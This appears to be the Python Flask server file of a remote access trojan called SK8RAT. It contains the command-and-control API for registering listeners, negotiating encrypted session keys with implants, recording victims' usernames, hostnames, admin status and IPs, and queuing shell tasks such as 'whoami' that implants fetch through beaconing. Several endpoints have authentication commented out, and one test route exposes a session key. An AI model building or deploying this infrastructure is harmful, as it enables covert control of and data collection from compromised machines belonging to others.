from flask_restful import Resource, reqparse
from flask import request, session
from models import (UserModel, RevokedTokenModel, ListenerModel,
                    TaskModel, SK8RATModel)
from flask_jwt_extended import (create_access_token, create_refresh_token,
                                jwt_required, jwt_refresh_token_required,
                                get_jwt_identity, get_raw_jwt)
import nacl.secret
import nacl.utils
from nacl.public import PrivateKey, SealedBox
from nacl import encoding
import base64
import random
import string
import json


parser = reqparse.RequestParser()
parser.add_argument('username',
                    help='This field cannot be blank',
                    required=True
                    )
parser.add_argument('password',
                    help='This field cannot be blank',
                    required=True
                    )


#  /api/version
class Version(Resource):
    @jwt_required
    def get(self):
        return {'version': '1.0'}


#  /api/admin/login
class AdminLogin(Resource):
    def post(self):
        data = parser.parse_args()
        current_user = UserModel.find_by_username(data['username'])
        if not current_user:
            return {'message':
                    'User {} doesn\'t exist'.format(data['username'])}
        if UserModel.verify_hash(data['password'], current_user.password):
            access_token = create_access_token(identity=data['username'])
            refresh_token = create_refresh_token(identity=data['username'])
            return {
                'message': 'Logged in as {}'.format(current_user.username),
                'access_token': access_token,
                'refresh_token': refresh_token
                }
        else:
            return {'message': 'Wrong credentials'}


#  /api/admin/logout/access
class AdminLogoutAccess(Resource):
    @jwt_required
    def post(self):
        jti = get_raw_jwt()['jti']
        try:
            revoked_token = RevokedTokenModel(jti=jti)
            revoked_token.add()
            return {'message': 'Access token has been revoked'}
        except Exception:
            return {'message': 'Something went wrong'}, 500


#  /api/admin/logout/refresh
class AdminLogoutRefresh(Resource):
    @jwt_refresh_token_required
    def post(self):
        jti = get_raw_jwt()['jti']
        try:
            revoked_token = RevokedTokenModel(jti=jti)
            revoked_token.add()
            return {'message': 'Refresh token has been revoked'}
        except Exception:
            return {'message': 'Something went wrong'}, 500


#  /api/admin/token/refresh
class AdminTokenRefresh(Resource):
    @jwt_refresh_token_required
    def post(self):
        current_user = get_jwt_identity()
        access_token = create_access_token(identity=current_user)
        return {'access_token': access_token}


#  /api/admin/users
class AdminUsers(Resource):
    @jwt_required
    def get(self):
        return UserModel.return_all()

    @jwt_required
    def delete(self):
        return UserModel.delete_all()

    @jwt_required
    def post(self):
        data = parser.parse_args()
        if UserModel.find_by_username(data['username']):
            return {'message':
                    'User {} already exists'.format(data['username'])}
        new_user = UserModel(
            username=data['username'],
            password=UserModel.generate_hash(data['password'])
        )
        try:
            new_user.save_to_db()
            access_token = create_access_token(identity=data['username'])
            refresh_token = create_refresh_token(identity=data['username'])
            return {
                'message': 'User {} was created'.format(data['username']),
                'access_token': access_token,
                'refresh_token': refresh_token
                }
        except Exception:
            return {'message': 'Something went wrong'}, 500


#  /api/listeners/http
class CreateListener(Resource):
    #  @jwt_required
    def post(self):
        if not request.is_json:
            return {'message': 'Invalid JSON object'}

        # Make sure only 1 listener exists
        Listener = ListenerModel.query.filter(ListenerModel.listener_type == "http").first()
        if Listener:
            return {'message': 'Http listener already exists.'}

        content = request.get_json()
        # Generate shared key
        sharedkey = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        sharedkey_b64 = base64.b64encode(sharedkey).decode("UTF-8")
        new_listener = ListenerModel(
            name=content['name'],
            description="SK8RATs http listener",
            ip=content['ip'],
            port=content['port'],
            listener_type="http",
            shared_key=sharedkey_b64
        )
        new_listener.save_to_db()
        return {'message': 'Listener created'}


#  /api/listeners
class AllListeners(Resource):
    #  @jwt_required
    def get(self):
        return ListenerModel.return_all()

    #  @jwt_required
    def delete(self):
        return ListenerModel.delete_all()


#  /api/listeners/<name>
class SingleListener(Resource):
    #  @jwt_required
    def get(self, listener_name):
        return ListenerModel.return_single(listener_name)

    #  @jwt_required
    def delete(self, listener_name):
        return ListenerModel.delete_single(listener_name)


#  /api/listeners/options/<listener type>
class OptionsListener(Resource):
    @jwt_required
    def get(self):
        return "TO-DO (return listener options)"


#  /api/SK8RATs
class AllSK8RATs(Resource):
    #  @jwt_required
    def get(self):
        return SK8RATModel.return_all()

    #  @jwt_required
    def delete(self):
        return SK8RATModel.delete_all()


#  /api/SK8RATs/<name>
class SingleSK8RAT(Resource):
    #  @jwt_required
    def get(self, SK8RAT_name):
        return SK8RATModel.return_single(SK8RAT_name)

    #  @jwt_required
    def delete(self, SK8RAT_name):
        return SK8RATModel.delete_single(SK8RAT_name)

    #  @jwt_required
    def post(self, SK8RAT_name):
        # Get raw request and read as json blob
        request_raw = request.data.decode("UTF-8")
        json_blob = json.loads(request_raw)
       
        # Update name, sleep and jitter
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.name == SK8RAT_name).first()
        if (json_blob['name'] != ""):
            SK8RAT.name = json_blob['name']
        if (json_blob['sleep'] != ""):
            SK8RAT.sleep = json_blob['sleep']
        if (json_blob['jitter'] != ""):
            SK8RAT.jitter = json_blob['jitter']
        SK8RAT.save_to_db()

        return {'message': 'Success'}


#  /api/tasks/<name>, accepts {"task":"<tasking>"}
class TaskSK8RAT(Resource):
    #  @jwt_required
    def post(self, SK8RAT_name):
        # Get raw request and read as json blob
        request_raw = request.data.decode("UTF-8")
        json_blob = json.loads(request_raw)

        # Check SK8RAT by name
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.name == SK8RAT_name).first()

        # If name doesn't exist, error; else grab guid
        if (not SK8RAT):
            return {'message': 'SK8RAT does not exist.'}
        guid = SK8RAT.guid

        # Check guid against tasking database
        task = TaskModel.query.filter(TaskModel.guid == guid).first()

        if (task is None):
            # task was not found, create initial
            new_task = TaskModel(
                guid=guid,
                task_id=1,
                task=json_blob['task'],
                task_status="wait",
                task_output=""
            )
        else:
            # task was found, find most recent task_id for this guid, add 1
            task2 = TaskModel.query.filter(TaskModel.guid == guid).order_by(TaskModel.task_id.desc()).first()       
            new_task = TaskModel(
                guid=guid,
                task_id=task2.task_id + 1,
                task=json_blob['task'],
                task_status="wait",
                task_output=""
            )
        
        new_task.save_to_db()
        message = "Task " + json_blob['task'] + " with task id " + str(new_task.task_id) +\
                  " assigned to " + SK8RAT.name + "."
        return {'message': message}

    #  @jwt_required
    def get(self, SK8RAT_name):
        # Check SK8RAT by name
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.name == SK8RAT_name).first()
        # If name doesn't exist, error; else grab guid
        if (not SK8RAT):
            return {'message': 'SK8RAT does not exist.'}
        guid = SK8RAT.guid
        return TaskModel.return_single(guid)


#  /api/tasks/
class TaskAllSK8RAT(Resource):
    #  @jwt_required
    def get(self):
        return TaskModel.return_all()
  
    #  @jwt_required
    def delete(self):
        return TaskModel.delete_all()


#  /stage0
class NegotiateSessionKey(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")    
  
        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Grab shared key from listener
        Listener = ListenerModel.query.filter(ListenerModel.listener_type == "http").first()
        sharedkey = base64.b64decode(Listener.shared_key)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(sharedkey)
        client_publickey = box.decrypt(ciphertext, nonce)

        # Generate final session key
        session_key = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)

        # Write SK8RAT to database with agent name + b64(sessionkey)
        new_SK8RAT = SK8RATModel(
            name=''.join(random.choices(string.ascii_uppercase + string.digits, k=15)),
            guid=guid,
            session_key=base64.b64encode(session_key).decode("UTF-8"),
            session_cookie=''.join(random.choices(string.ascii_uppercase + string.digits, k=15)),
            external_ip=request.remote_addr
        )
        new_SK8RAT.save_to_db()

        # Use sealed box to send session key to SK8RAT
        publickey = nacl.public.PublicKey(client_publickey)
        sealed_box = SealedBox(publickey)
        encrypted = sealed_box.encrypt(session_key)

        return base64.b64encode(encrypted).decode("UTF-8")


# /stage1
class ChallengeResponseOne(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Obtain sessionkey from database
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.guid == guid).first()
        session_key = base64.b64decode(SK8RAT.session_key)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(session_key)
        client_challenge = box.decrypt(ciphertext, nonce)

        # Stuff client and server challenge into db
        server_challenge = nacl.utils.random(4)
        SK8RAT.client_challenge = base64.b64encode(client_challenge).decode("UTF-8")
        SK8RAT.server_challenge = base64.b64encode(server_challenge).decode("UTF-8")
        SK8RAT.save_to_db()

        # Prepare server response K[client_challenge + server_challenge]
        message = client_challenge + server_challenge
        box = nacl.secret.SecretBox(session_key)
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        encrypted = box.encrypt(message, nonce)
        ciphertext = encrypted.ciphertext
        ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
        nonce_b64 = base64.b64encode(nonce).decode("UTF-8")
        server_response = nonce_b64 + ":" + ciphertext_b64

        return server_response


# /stage2
class ChallengeResponseTwo(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        guid = post_data[0]
        nonce = base64.b64decode(post_data[1])
        ciphertext = base64.b64decode(post_data[2])

        # Obtain sessionkey from database
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.guid == guid).first()
        session_key = base64.b64decode(SK8RAT.session_key)

        # Obtain server_challenge from database
        server_challenge = base64.b64decode(SK8RAT.server_challenge)

        # Decode ciphertext using pynacl
        box = nacl.secret.SecretBox(session_key)
        server_challenge_returned = box.decrypt(ciphertext, nonce)

        # return K[session_cookie] if challenge matches, else return 0
        if (server_challenge == server_challenge_returned):
            message = (SK8RAT.session_cookie).encode("UTF-8")
            box = nacl.secret.SecretBox(session_key)
            nonce_server = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
            encrypted = box.encrypt(message, nonce_server)
            ciphertext = encrypted.ciphertext
            ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
            nonce_b64 = base64.b64encode(nonce_server).decode("UTF-8")
            server_response = nonce_b64 + ":" + ciphertext_b64
            return server_response
        else:
            return {'message': 'Potential MITM!'}


# /stage3
class FirstCheckIn(Resource):
    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        nonce = base64.b64decode(post_data[0])
        ciphertext = base64.b64decode(post_data[1])

        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}
        
        # Decode ciphertext using pynacl, store as json object
        box = nacl.secret.SecretBox(session_key)
        json_string = box.decrypt(ciphertext, nonce)
        json_blob = json.loads(json_string)

        # Parse json object and update database
        SK8RAT.username = json_blob['username']
        SK8RAT.hostname = json_blob['hostname']
        SK8RAT.pid = json_blob['pid']
        SK8RAT.internal_ip = json_blob['internal_ip']
        SK8RAT.admin = json_blob['admin']
        SK8RAT.os = json_blob['os']
        SK8RAT.listener_id = json_blob['listener_id']
        SK8RAT.server_ip = json_blob['server_ip']
        SK8RAT.sleep = json_blob['sleep']
        SK8RAT.jitter = json_blob['jitter']
        SK8RAT.last_seen = json_blob['last_seen']
        SK8RAT.save_to_db()

        return 1


# /beaconing
class Beaconing(Resource):
    def get(self):
        
        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}

        task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_status == "wait").all()        

        # Assemble task_id, task, task_status, task_output
        task_id_list = []
        task_list = []
        task_status_list = []
        task_output_list = []
        for x in task:
            task_id_list.append(x.task_id)
            task_list.append(x.task)
            task_status_list.append(x.task_status)
            task_output_list.append(x.task_output)

        # Assemble complete message
        # <SK8RAT_Message Structure>
        # guid
        # last_seen
        # sleep
        # jitter
        # task_id
        # task
        # task_status
        # task_output
        data = {}
        data['guid'] = SK8RAT.guid
        data['last_seen'] = SK8RAT.last_seen
        data['sleep'] = SK8RAT.sleep
        data['jitter'] = SK8RAT.jitter
        data['task_id'] = task_id_list
        data['task'] = task_list
        data['task_status'] = task_status_list
        data['task_output'] = task_output_list

        # Server response assembled
        json_data = json.dumps(data)

        # Encrypt server response
        message = json_data
        box = nacl.secret.SecretBox(session_key)
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        encrypted = box.encrypt(message.encode("UTF=8"), nonce)
        ciphertext = encrypted.ciphertext
        ciphertext_b64 = base64.b64encode(ciphertext).decode("UTF-8")
        nonce_b64 = base64.b64encode(nonce).decode("UTF-8")
        server_response = nonce_b64 + ":" + ciphertext_b64

        return server_response

    def post(self):
        # Get raw request
        request_raw = request.data.decode("UTF-8")

        # Split by ":"
        post_data = request_raw.split(":")
        nonce = base64.b64decode(post_data[0])
        ciphertext = base64.b64decode(post_data[1])

        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
        session_cookie = request.cookies.get('macaroon')
        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
        if (SK8RAT):
            session_key = base64.b64decode(SK8RAT.session_key)
        else:
            return {'message': 'Bad cookie.'}
        
        # Decode ciphertext using pynacl, store as json object
        box = nacl.secret.SecretBox(session_key)
        json_string = box.decrypt(ciphertext, nonce)
        json_blob = json.loads(json_string)

        # <SK8RAT_Message Structure>
        # guid
        # last_seen
        # sleep
        # jitter
        # task_id
        # task
        # task_status
        # task_output

        # Update last_seen in database
        SK8RAT.last_seen = json_blob['last_seen']
        SK8RAT.save_to_db()

        # Loop through and match task_id and guid to retrieve correct TaskModel
        counter = 0
        for x in json_blob['task_id']:
            Task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_id == x).first()
            Task.task_status = json_blob['task_status'][counter]
            Task.task_output = json_blob['task_output'][counter]
            Task.save_to_db()
            counter = counter + 1
            

# /sessiontest1
class sessiontest1(Resource):
    def get(self):
        data = {}
        data['guid'] = 'this is a guid'
        data['task_id'] = [1, 2]
        data['task'] = ["whoami", "pwd"]
        data['task_state'] = ["wait", "wait"]
        data['task_output'] = [" ", " "]
        data['last_seen'] = "this is a time"
        data['sleep'] = 5
        data['jitter'] = 10
        json_data = json.dumps(data)
        return json_data




# /sessiontest2
class sessiontest2(Resource):
    def get(self):
        SK8RAT = SK8RATModel.query.order_by(SK8RATModel.id.desc()).first()
        session_key = base64.b64decode(SK8RAT.session_key)
        return session_key
